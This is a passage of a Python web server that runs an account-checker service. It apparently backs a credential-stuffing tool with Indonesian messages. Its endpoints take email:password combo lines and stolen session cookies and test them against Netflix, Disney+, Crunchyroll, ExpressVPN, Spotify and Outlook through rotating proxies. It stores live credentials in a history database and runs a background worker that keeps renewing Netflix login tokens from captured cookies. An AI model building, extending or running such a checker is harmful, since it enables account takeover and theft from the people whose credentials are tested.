                    self.end_headers()
                    self.wfile.write(json.dumps({"error": f"Unknown action: {action}"}).encode("utf-8"))
                    return
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps(result).encode("utf-8"))

        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/outlook/check", "/api/crunchyroll/cookie-check", "/api/disney/cookie-check", "/api/proxies/save", "/api/proxies/test", "/api/proxies/test/stop", "/api/proxies/test_single", "/api/proxies/add", "/api/proxies/remove", "/api/history/clear", "/api/system/reload"):
            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/outlook/check", "/api/crunchyroll/cookie-check", "/api/disney/cookie-check") else 50
            if is_rate_limited(client_ip, max_requests=rate_limit, window_seconds=10, bucket="api"):
                self.send_response(429)
                self.send_header("Content-Type", "application/json")
                self.send_header("Retry-After", "5")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(b'{"error": "Too Many Requests. Rate limit exceeded."}')
                return

            # Checker endpoints are public; proxy management needs API key
            proxy_mgmt = {"/api/proxies/save", "/api/proxies/test", "/api/proxies/test/stop",
                          "/api/proxies/test_single", "/api/proxies/add", "/api/proxies/remove",
                          "/api/history/clear", "/api/system/reload"}
            if self.path in proxy_mgmt:
                if not check_api_key_authorized(self.headers):
                    self.send_response(401)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(b'{"error": "Unauthorized: API Key required"}')
                    return

            if self.path == "/api/token":
                try:
                    p = json.loads(body.decode("utf-8"))
                    token_url, android_url, tv_url, token, exp, route = generate_nftoken(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
                    res = json.dumps({
                        "url": token_url,
                        "android_url": android_url,
                        "tv_url": tv_url,
                        "token": token,
                        "expires": exp,
                        "route": route
                    }).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"error": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    out = check_netflix_membership(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"live": False, "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/disney/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    email = p.get("email", "").strip()
                    password = p.get("password", "").strip()
                    if not email or not password:
                        combo = p.get("combo", "").strip()
                        if combo:
                            # Strip metadata after email:password (e.g. "email:pass | Sub:... | ...")
                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
                            if ":" in combo_clean:
                                email, password = combo_clean.split(":", 1)
                                email = email.strip()
                                password = password.strip()
                    if not email or not password:
                        raise ValueError("Email dan password wajib diisi")
                    out = check_disney_account(email, password, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/crunchyroll/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    email = p.get("email", "").strip()
                    password = p.get("password", "").strip()
                    if not email or not password:
                        combo = p.get("combo", "").strip()
                        if combo:
                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
                            if ":" in combo_clean:
                                email, password = combo_clean.split(":", 1)
                                email = email.strip()
                                password = password.strip()
                    if not email or not password:
                        raise ValueError("Email dan password wajib diisi")
                    out = check_crunchyroll_account(email, password, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/expressvpn/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    email = p.get("email", "").strip()
                    password = p.get("password", "").strip()
                    if not email or not password:
                        combo = p.get("combo", "").strip()
                        if combo:
                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
                            if ":" in combo_clean:
                                email, password = combo_clean.split(":", 1)
                                email = email.strip()
                                password = password.strip()
                    if not email or not password:
                        raise ValueError("Email dan password wajib diisi")
                    def _evpn_proxy_fn():
                        prx, label, raw = get_random_proxy()
                        if prx:
                            return prx.get('http') or prx.get('https')
                        return None
                    out = check_expressvpn_account(
                        email, password,
                        use_proxy=p.get("use_proxy", True),
                        get_proxy_fn=_evpn_proxy_fn,
                        save_history_fn=save_history
                    )
                    # Save ExpressVPN result to history DB
                    evpn_status = out.get("status", "ERROR")
                    evpn_plan = out.get("plan", "")
                    if evpn_plan:
                        evpn_plan = f"ExpressVPN {evpn_plan}"
                    evpn_billing = ""
                    if out.get("expire_date"):
                        days = out.get("days_left", 0)
                        evpn_billing = f"Exp: {out['expire_date']} ({days}d left)"
                        if out.get("auto_renew") == "true":
                            evpn_billing += " [Auto-renew]"
                    evpn_route = out.get("route", "Direct")
                    if isinstance(evpn_route, tuple):
                        evpn_route = str(evpn_route[1]) if len(evpn_route) > 1 else str(evpn_route)
                    save_history("expressvpn", evpn_status, plan=evpn_plan, billing=evpn_billing,
                                 country="", route=evpn_route,
                                 raw_cookie=f"{email}:{password}", email=email)
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/spotify/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    cookie = p.get("cookie", "").strip()
                    if not cookie:
                        raise ValueError("Cookie wajib diisi")
                    out = check_spotify_cookie(cookie, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/outlook/check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    email = p.get("email", "").strip()
                    password = p.get("password", "").strip()
                    # Support combo field (email:password)
                    combo = p.get("combo", "").strip()
                    if combo and ":" in combo and not email:
                        parts = combo.split(":", 1)
                        email = parts[0].strip()
                        password = parts[1].strip()
                    if not email or not password:
                        raise ValueError("Email dan password wajib diisi")
                    out = check_outlook_account(email, password, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/crunchyroll/cookie-check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    cookie = p.get("cookie", "").strip()
                    if not cookie:
                        raise ValueError("Cookie wajib diisi")
                    out = check_crunchyroll_cookie(cookie, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/disney/cookie-check":
                try:
                    p = json.loads(body.decode("utf-8"))
                    cookie = p.get("cookie", "").strip()
                    if not cookie:
                        raise ValueError("Cookie wajib diisi")
                    out = check_disney_cookie(cookie, use_proxy=p.get("use_proxy", True))
                    res = json.dumps(out).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/proxies/save":
                try:
                    p = json.loads(body.decode("utf-8"))
                    text = p.get("text", "")
                    with open(PROXIES_FILE, "w", encoding="utf-8") as f:
                        f.write(text.strip() + "\n")
                    with proxy_lock:
                        healthy_proxies.clear()
                        all_tested_proxies.clear()
                    all_p = load_proxies(force_reload=True)
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": True, "count": len(all_p)}).encode("utf-8"))
                except Exception as e:
                    self.send_response(400)
                    self.send_cors_headers()
                    self.end_headers()

            elif self.path == "/api/proxies/test":
                try:
                    p = json.loads(body.decode("utf-8")) if body and body != b"{}" else {}
                    lim_raw = p.get("limit", 100)
                    if str(lim_raw).lower() in ("all", "0", "semua", "none"):
                        limit = 0
                    else:
                        limit = int(lim_raw)
                    mode = str(p.get("mode", "untested")).lower()
                    started, msg = start_background_proxy_test(limit=limit, mode=mode)
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": True, "started": started, "message": msg, "testing": True}).encode("utf-8"))
                except Exception as e:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode("utf-8"))

            elif self.path == "/api/proxies/test_single":
                try:
                    p = json.loads(body.decode("utf-8"))
                    proxy_str = p.get("proxy", "").strip()
                    if not proxy_str:
                        raise ValueError("Proxy string wajib diisi")
                    ok, lat, item = test_single_proxy_func(proxy_str)
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "ok": ok,
                        "status": item.get("status", "FAIL"),
                        "latency": lat,
                        "proxy": item.get("proxy")
                    }).encode("utf-8"))
                except Exception as e:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json")
                    self.send_cors_headers()
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": False, "error": str(e)}).encode("utf-8"))

            elif self.path == "/api/proxies/test/stop":
                stopped, msg = stop_background_proxy_test()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(json.dumps({"ok": stopped, "message": msg}).encode("utf-8"))

            elif self.path == "/api/proxies/add":
                try:
                    p = json.loads(body.decode("utf-8"))
                    text = p.get("text", "").strip()
                    if not text:
                        raise ValueError("Tidak ada proxy untuk ditambahkan")
                    new_proxies = []
                    for line in text.splitlines():
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        new_proxies.append(line)
                    if not new_proxies:
                        raise ValueError("Tidak ada proxy valid ditemukan")
                    existing = set()
                    if os.path.exists(PROXIES_FILE):
                        with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                            for l in f:
                                l = l.strip()
                                if l:
                                    existing.add(l)
                    added = 0
                    for px in new_proxies:
                        if px not in existing:
                            existing.add(px)
                            added += 1
                    with open(PROXIES_FILE, "w", encoding="utf-8") as f:
                        f.write("\n".join(sorted(existing)) + "\n")
                    with proxy_lock:
                        healthy_proxies.clear()
                        all_tested_proxies.clear()
                    load_proxies(force_reload=True)
                    res = json.dumps({"ok": True, "added": added, "total": len(existing)}).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"ok": False, "error": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/proxies/remove":
                try:
                    p = json.loads(body.decode("utf-8"))
                    if p.get("action") == "clear_dead":
                        removed, total = clean_dead_proxies_serverside()
                        res = json.dumps({"ok": True, "removed": removed, "total": total}).encode("utf-8")
                    elif p.get("action") == "clear_all":
                        with open(PROXIES_FILE, "w", encoding="utf-8") as f:
                            f.write("")
                        with proxy_lock:
                            healthy_proxies.clear()
                            all_tested_proxies.clear()
                        load_proxies(force_reload=True)
                        res = json.dumps({"ok": True, "removed": "all", "total": 0}).encode("utf-8")
                    else:
                        to_remove = set()
                        # Support list or text
                        raw_input = p.get("text", "") or ""
                        for line in raw_input.strip().splitlines():
                            line = line.strip()
                            if line:
                                to_remove.add(line)
                        for item in p.get("proxies", []):
                            item_str = str(item).strip()
                            if item_str:
                                to_remove.add(item_str)
                        if not to_remove:
                            raise ValueError("Tidak ada proxy untuk dihapus")
                        removed, total = remove_proxies_flexible(to_remove)
                        res = json.dumps({"ok": True, "removed": removed, "total": total}).encode("utf-8")
                    self.send_response(200)
                except Exception as e:
                    res = json.dumps({"ok": False, "error": str(e)}).encode("utf-8")
                    self.send_response(400)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(res)

            elif self.path == "/api/system/reload":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(b'{"status": "reloading"}')
                def _do_exit():
                    time.sleep(0.5)
                    os._exit(0)
                threading.Thread(target=_do_exit, daemon=True).start()
            elif self.path == "/api/history/clear":
                try:
                    payload = json.loads(body.decode("utf-8")) if body else {}
                except Exception:
                    payload = {}
                only_dead = bool(payload.get("only_dead", False))
                clear_history(only_dead=only_dead)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_cors_headers()
                self.end_headers()
                self.wfile.write(b'{"status": "cleared"}')
        else:
            self.send_response(404)
            self.send_cors_headers()
            self.end_headers()

def session_vault_worker():
    """Background worker: automatically renews and validates expiring active sessions in DB."""
    while True:
        time.sleep(1800)
        try:
            with db_lock:
                conn = get_db()
                c = conn.cursor()
                c.execute("SELECT id, raw_cookie FROM history WHERE type IN ('netflix', 'checker', 'single', 'bulk') AND status = 'LIVE' AND raw_cookie != '' ORDER BY id DESC LIMIT 25")
                rows = c.fetchall()
                conn.close()

            for row_id, raw_cookie in rows:
                try:
                    t_url, a_url, tv_url, tok, exp, route = generate_nftoken(raw_cookie, use_proxy=True)
                    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with db_lock:
                        conn = get_db()
                        conn.execute('UPDATE history SET token_url = ?, created_at = ? WHERE id = ?', (t_url, now, row_id))
                        conn.commit()
                        conn.close()
                    logging.info(f"Session Vault: renewed token for history ID {row_id}")
                except Exception as e:
                    err = str(e).lower()
                    if any(k in err for k in ("mati", "invalid", "tidak ditemukan", "401", "403")):
                        with db_lock:
                            conn = get_db()
                            conn.execute('UPDATE history SET status = "DEAD" WHERE id = ?', (row_id,))
                            conn.commit()
                            conn.close()
                        logging.warning(f"Session Vault: marked ID {row_id} as DEAD ({e})")
                    else:
                        logging.warning(f"Session Vault: renew error ID {row_id}: {e}")
                time.sleep(2)
        except Exception as ex:
            logging.error(f"Session Vault worker error: {ex}")


class ThreadingSimpleServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

def run():
    init_db()
    load_proxies(force_reload=True)
    threading.Thread(target=proxy_health_worker, daemon=True).start()
    threading.Thread(target=session_vault_worker, daemon=True).start()

    # Prevent duplicate zombie processes on Windows
    socketserver.TCPServer.allow_reuse_address = False if os.name == "nt" else True
    server = ThreadingSimpleServer(("", PORT), Handler)
    print(f"Server jalan: http://localhost:{PORT}")
    logging.info(f"Server started on port {PORT}")
    server.serve_forever()

if __name__ == "__main__":
    run()
